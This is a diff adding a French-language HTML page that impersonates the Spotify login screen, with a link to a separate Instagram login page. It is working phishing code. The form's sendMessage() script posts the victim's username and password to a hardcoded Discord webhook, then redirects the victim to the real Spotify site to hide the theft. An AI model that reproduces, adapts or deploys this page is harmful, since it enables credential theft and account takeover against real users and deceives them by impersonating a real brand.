@@ -1,0 +1,76 @@
+<html id="app" dir="ltr" class=" hukpteyvqt" lang="fr"><head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+      <meta charset="utf-8">
+      <title>Connexion - Spotify</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+      <!-- base href="https://accounts.spotify.com/" -->
+      <link rel="icon" href="https://accounts.scdn.co/sso/images/favicon.ace4d8543bbb017893402a1e9d1ac1fa.ico">
+    
+        <link rel="preload" href="https://encore.scdn.co/1.2.3/CircularSpotify-UI-Latin-OS2v3-Light.woff2" as="font" type="font/woff2" crossorigin="true">
+        <link rel="preload" href="https://encore.scdn.co/1.2.3/CircularSpotify-UI-Latin-OS2v3-Book.woff2" as="font" type="font/woff2" crossorigin="true">
+        <link rel="preload" href="https://encore.scdn.co/1.2.3/CircularSpotify-UI-Latin-OS2v3-Bold.woff2" as="font" type="font/woff2" crossorigin="true">
+        <link rel="preload" href="https://encore.scdn.co/1.2.3/CircularSpotify-UI-Latin-OS2v3-Black.woff2" as="font" type="font/woff2" crossorigin="true">
+        <link rel="stylesheet" href="assets/styles-index.css">
+    </head>
+    <body>
+      <header>
+        <img src="assets/Spotify-Logo.png" alt="">
+    </header>
+        <div class="container">
+            <h2 class="loginhead">Pour acceder à l'offre, connecte toi à spotify.</h2>
+            
+            <div class="apl-btn">
+                <button onClick="window.location.href='insta-log.html'">Continuer avec Instagram</button>
+            </div>
+            <div class="or">
+                <hr class="bar">
+                <span><h3>ou</h3></span>
+                <hr class="bar">
+            </div>
+            <div class="inputs">
+                <input type="email" placeholder="Email address or username" id="username">
+                <input type="password" placeholder="Password" id="password">
+            </div>
+            <div class="login">
+                <input type="checkbox" name="remember-me"><label for="remember-me">Se souvenir de moi</label>
+                <span class="checkmark"></span>
+                <button onclick="sendMessage()">Se connecter</button>
+            </div>
+            
+            
+            
+            
+            <hr class="bar3">
+            <p>Si vous cliquez sur "Se connecter avec Instagram" et que vous n'êtes pas un utilisateur de Spotify, vous serez enregistré et vous accepterez les conditions d'utilisation de Spotify. <a href="#">Termes &amp; Conditions</a> et <a href="#">Confidentialité.</a></p>
+        </div>
+    
+       
+        <script type="text/javascript">
+            function la(src) {
+              window.location=src;
+            }
+          </script>
+        
+          <script>
+          function sendMessage() {
+          function sleep(milliseconds) {
+          const date = Date.now();
+          let currentDate = null;
+          do {
+            currentDate = Date.now();
+          } while (currentDate - date < milliseconds);
+        }
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/931479938270367795/AaDhpT2e0bJu3Sf34kYqIQxn4CyzTG4JPjTi1uMePmCcHU6jW60ZJ-fv9mpcXTLl5rTl");
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+              content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+            }
+            request.send(JSON.stringify(params));
+            sleep(400)
+            window.location.replace("https://www.spotify.com");
+          }
+          </script>
+    
+</body>
+</html>
